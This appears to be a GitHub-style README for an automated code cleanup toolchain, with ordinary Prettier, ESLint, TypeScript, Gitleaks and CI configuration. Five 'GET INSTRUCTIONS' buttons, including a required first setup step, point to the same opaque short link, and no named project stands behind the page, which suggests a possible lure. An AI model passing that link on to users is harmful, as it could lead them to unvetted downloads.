# 🐍 Automatic Code Cleanup — Complete Guide

<div align="center">

![Code Cleanup](https://img.shields.io/badge/Code-Cleanup-0891B2?style=for-the-badge&logo=clean&logoColor=white)
![Automation](https://img.shields.io/badge/Automation-Pipeline-7C3AED?style=for-the-badge&logo=githubactions&logoColor=white)
![Linters](https://img.shields.io/badge/Linters-30%2B-16A34A?style=for-the-badge&logo=eslint&logoColor=white)
![Guides](https://img.shields.io/badge/Guides-95K-EA580C?style=for-the-badge&logo=readthedocs&logoColor=white)

### 🧹 Automated Refactoring, Formatting & Linting Pipeline

*A complete guide to keeping codebases pristine automatically*

</div>

<div align="center">

<img width="1200" height="618" alt="1_SNBftW2TNMR8fs2Ph8SnxA" src="https://github.com/user-attachments/assets/ed1886b0-91e6-49c9-82f7-b0841be7895d" />

</div>

---

## 🗺️ Documentation Layout

> **🧭 Guide navigation tree**

```
╔══════════════════════════════════════════════════╗
║      AUTOMATIC CODE CLEANUP — GUIDE MAP          ║
╠══════════════════════════════════════════════════╣
║                                                  ║
║  ◈ PART I — FOUNDATIONS                          ║
║    ├─ Overview                                   ║
║    ├─ Why Automate?                              ║
║    └─ Tool Stack                                 ║
║                                                  ║
║  ◈ PART II — PREPARATION                         ║
║    ├─ Requirements                               ║
║    ├─ Get Instructions                           ║
║    └─ Project Bootstrap                          ║
║                                                  ║
║  ◈ PART III — PIPELINE                           ║
║    ├─ Formatters                                 ║
║    ├─ Linters                                    ║
║    ├─ Type Checkers                              ║
║    └─ Security Scanners                          ║
║                                                  ║
║  ◈ PART IV — AUTOMATION                          ║
║    ├─ Git Hooks                                  ║
║    ├─ CI/CD                                      ║
║    └─ Scheduled Jobs                             ║
║                                                  ║
║  ◈ PART V — SUPPORT                              ║
║    ├─ Troubleshooting                            ║
║    ├─ FAQ                                        ║
║    └─ Resources                                  ║
╚══════════════════════════════════════════════════╝
```

---

## 🎯 Overview

**Automatic Code Cleanup** is a modern toolchain that keeps your codebase consistently formatted, linted, type-safe, and secure — without manual effort. Every commit is inspected, auto-fixed where safe, and blocked only when human attention is genuinely required.

The result: fewer style debates, cleaner pull requests, fewer production bugs, and a codebase that gets better over time instead of drifting.

### 🧩 What It Handles

| Category | Examples |
|---------|---------|
| 🎨 **Formatting** | Indentation, quotes, line length |
| 🔍 **Linting** | Unused vars, dead code |
| 🧠 **Type Safety** | Type errors, null checks |
| 🔐 **Security** | Vulnerable deps, secrets |
| 📚 **Imports** | Sort, prune, dedupe |
| 🧹 **Dead Code** | Unreachable branches |
| 📝 **Docs** | JSDoc/TSDoc sync |
| 🔄 **Migration** | Deprecated APIs |

---

## 💡 Why Automate?

| Manual Approach | Automated Pipeline |
|-----------------|-------------------|
| 🐌 Slow reviews | ⚡ Instant fixes |
| 🎭 Style debates | 📏 Enforced rules |
| 🐛 Escaped bugs | 🛡️ Pre-merge checks |
| 🧠 Reviewer fatigue | 🤖 Machine-first pass |
| 📉 Drift over time | 📈 Continuous improvement |
| 🔓 Security lapses | 🔒 Continuous scanning |

---

## 🧰 Tool Stack

| Layer | Recommended | Alternatives |
|-------|-------------|--------------|
| 🎨 Formatter | **Prettier** | Biome, dprint |
| 🔍 Linter | **ESLint** | Biome, oxlint |
| 🧠 Types | **TypeScript** | Flow, JSDoc |
| 🔐 Security | **Semgrep** | CodeQL, Snyk |
| 📦 Deps | **Renovate** | Dependabot |
| 🔑 Secrets | **Gitleaks** | TruffleHog |
| 🐍 Python | **Ruff** | Black + Flake8 |
| 🦀 Rust | **Clippy** | rustfmt |
| 🐹 Go | **golangci-lint** | gofmt |
| ☕ Java | **Spotless** | Checkstyle |

---

## 🖥️ System Requirements

### 🔹 Minimum

```
✅ OS: Windows 10, macOS 11+, Ubuntu 20.04+
✅ CPU: Dual-core 2.0 GHz
✅ RAM: 4 GB
✅ Storage: 500 MB
✅ Node.js: 18+ (for JS tooling)
✅ Git: 2.30+
✅ Python: 3.9+ (if applicable)
```

### 🔸 Recommended

```
⭐ OS: Windows 11 / macOS 13+ / Ubuntu 22.04+
⭐ CPU: Quad-core 2.5 GHz+
⭐ RAM: 8 GB
⭐ Storage: 2 GB SSD
⭐ Node.js: 20 LTS
⭐ Editor: VSCode + extensions
⭐ CI: GitHub Actions / GitLab CI
```

<div align="center">

[![Get Instructions](https://img.shields.io/badge/📘_GET_INSTRUCTIONS-0891B2?style=for-the-badge&logo=readthedocs&logoColor=white&labelColor=155E75)](https://share.google/B35Pqfg06ZTKWLJfC)

</div>

---

## 📘 Get Instructions

<div align="center">

### 🚀 Access the Official Setup Guide

Click below to reach the instructions portal:

<br>

[![Get Instructions](https://img.shields.io/badge/📘_GET_INSTRUCTIONS-7C3AED?style=for-the-badge&logo=readthedocs&logoColor=white&labelColor=4C1D95)](https://share.google/B35Pqfg06ZTKWLJfC)

<br>

*Official • Open Source • Actively Maintained*

</div>

### 📚 Available Guides

| Guide | Purpose |
|-------|---------|
| 📘 **Bootstrap Guide** | Set up pipeline from scratch |
| 📗 **Rules Reference** | All linter rules explained |
| 📙 **CI Recipes** | GitHub, GitLab, CircleCI |
| 📕 **Migration Guide** | Adopt in existing projects |
| 📓 **Custom Rules** | Write your own rules |

---

## ⚙️ Project Bootstrap

### 🪜 Stage 1 — Access the Instructions

Open the official setup guide from the button above.

### 🪜 Stage 2 — Initialize Project

```bash
npm init -y
npm install --save-dev prettier eslint typescript
```

### 🪜 Stage 3 — Add Formatting

Create `.prettierrc.json`:

```json
{
  "semi": true,
  "singleQuote": true,
  "printWidth": 100,
  "tabWidth": 2,
  "trailingComma": "es5",
  "arrowParens": "always"
}
```

### 🪜 Stage 4 — Configure Linting

Create `eslint.config.js`:

```js
export default [
  {
    files: ['**/*.{js,ts}'],
    rules: {
      'no-unused-vars': 'error',
      'no-console': 'warn',
      'prefer-const': 'error'
    }
  }
];
```

<div align="center">

[![Get Instructions](https://img.shields.io/badge/📘_GET_INSTRUCTIONS-16A34A?style=for-the-badge&logo=readthedocs&logoColor=white&labelColor=14532D)](https://share.google/B35Pqfg06ZTKWLJfC)

</div>

### 🪜 Stage 5 — Add NPM Scripts

Edit `package.json`:

```json
{
  "scripts": {
    "format": "prettier --write .",
    "format:check": "prettier --check .",
    "lint": "eslint . --fix",
    "lint:check": "eslint .",
    "typecheck": "tsc --noEmit",
    "clean": "npm run format && npm run lint && npm run typecheck"
  }
}
```

### 🪜 Stage 6 — Run First Cleanup

```bash
npm run clean
```

### 🪜 Stage 7 — Review Changes

```bash
git diff
```

Commit the auto-fixes separately from feature work.

### 🪜 Stage 8 — Enable Git Hooks

```bash
npx husky init
echo "npm run clean" > .husky/pre-commit
```

---

## 🧪 Pipeline Stages

### 🎨 Formatters

| Tool | Language | Command |
|------|----------|---------|
| Prettier | JS/TS/CSS/MD | `prettier --write .` |
| Ruff | Python | `ruff format .` |
| rustfmt | Rust | `cargo fmt` |
| gofmt | Go | `gofmt -w .` |
| Spotless | Java | `mvn spotless:apply` |

### 🔍 Linters

| Tool | Language | Focus |
|------|----------|-------|
| ESLint | JS/TS | Style, bugs |
| Ruff | Python | Fast, all-in-one |
| Clippy | Rust | Idioms |
| golangci-lint | Go | 30+ linters |
| Semgrep | Multi | Security patterns |

### 🔐 Security Scanning

```bash
# Secrets
gitleaks detect --source .

# Dependencies
npm audit --audit-level=high

# SAST
semgrep --config=auto .
```

---

## 🤖 Automation

### 🪝 Git Hooks

```bash
# .husky/pre-commit
npm run format
npm run lint

# .husky/pre-push
npm run typecheck
npm test
```

### ⚙️ GitHub Actions

```yaml
name: Code Cleanup

on: [push, pull_request]

jobs:
  cleanup:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
      - run: npm ci
      - run: npm run format:check
      - run: npm run lint:check
      - run: npm run typecheck
      - run: gitleaks detect
```

### ⏰ Scheduled Maintenance

```yaml
on:
  schedule:
    - cron: '0 3 * * 1'  # Every Monday at 3 AM
```

---

## 🧪 Verification

| Check | Command | Expected |
|-------|---------|----------|
| ✅ Formatting | `npm run format:check` | No changes |
| ✅ Linting | `npm run lint:check` | No errors |
| ✅ Types | `npm run typecheck` | Clean |
| ✅ Secrets | `gitleaks detect` | None found |
| ✅ Deps | `npm audit` | No high CVEs |
| ✅ Hooks work | Commit test | Pre-commit runs |
| ✅ CI passes | Push test | Green build |
| ✅ Rollback works | `git revert` | Clean state |

---

## 🩺 Troubleshooting

| Problem | Cause | Solution |
|---------|-------|----------|
| 🚫 Prettier changes too much | Wrong config | Tune `.prettierrc` |
| 🚫 ESLint conflicts Prettier | Rule overlap | Use `eslint-config-prettier` |
| 🚫 Hook not running | Husky not installed | `npx husky install` |
| 🚫 CI fails on format | Local drift | Run `npm run format` |
| 🚫 Type errors after cleanup | Breaking change | Review commit |
| 🚫 Secrets flagged falsely | Test fixture | Add to `.gitleaksignore` |
| 🚫 Slow pre-commit | Too many files | Use `lint-staged` |
| 🚫 Merge conflicts | Parallel formats | Rebase often |
| 🚫 Rules ignored | File excluded | Check ignore files |
| 🚫 Binary files touched | No exclusion | Add to `.prettierignore` |

### 🧹 Clean Slate

```bash
rm -rf node_modules .cache
npm ci
npm run clean
```

---

## 🧰 CLI Reference

| Command | Purpose |
|---------|---------|
| `npm run format` | Auto-format all files |
| `npm run format:check` | Verify formatting |
| `npm run lint` | Auto-fix lint issues |
| `npm run lint:check` | Verify lint rules |
| `npm run typecheck` | Run TypeScript checks |
| `npm run clean` | Full pipeline |
| `npx lint-staged` | Only staged files |
| `npx gitleaks detect` | Scan for secrets |

---

## 📚 Resources

| Resource | Purpose |
|----------|---------|
| 📖 **Prettier Docs** | Formatter reference |
| 📗 **ESLint Docs** | Linter reference |
| 📙 **Renovate Docs** | Dependency updates |
| 💬 **Community** | Discord & forum |
| 🎥 **Video Guides** | Visual walkthroughs |

---

## 💬 FAQ

**Will auto-cleanup break my code?**
Formatters are safe; linters use conservative auto-fixes. Always review diffs.

**Can I use this on legacy projects?**
Yes — start with `--check` mode and introduce rules gradually.

**Does it work with monorepos?**
Yes — via workspaces and per-package configs.

**Which languages are supported?**
JS, TS, Python, Rust, Go, Java, and dozens more.

**Can I add custom rules?**
Yes — ESLint and Semgrep support custom rules.

**Does it run on every commit?**
Yes — via pre-commit hooks.

**Will it slow down my workflow?**
Use `lint-staged` to only check changed files.

**How do I disable a rule for one line?**
Add an inline comment like `// eslint-disable-next-line`.

**Can I use it without Node.js?**
Yes — many linters ship as standalone binaries.

**Is it free?**
Yes — the entire toolchain is open source.

---

## 📅 Version History

| Version | Date | Highlights |
|---------|------|-----------|
| **2.0.0** | Jan 2025 | Biome support |
| 1.9.0 | Nov 2024 | Semgrep integration |
| 1.7.0 | Aug 2024 | Renovate configs |
| 1.5.0 | May 2024 | Initial stable |

---

<div align="center">

### 🌟 Found This Guide Helpful?

[![Get Instructions](https://img.shields.io/badge/📘_GET_INSTRUCTIONS-EA580C?style=for-the-badge&logo=readthedocs&logoColor=white&labelColor=7C2D12)](https://share.google/B35Pqfg06ZTKWLJfC)

**⭐ Star this repository if it helped! ⭐**

*Made with 💜 for the developer community*

</div>
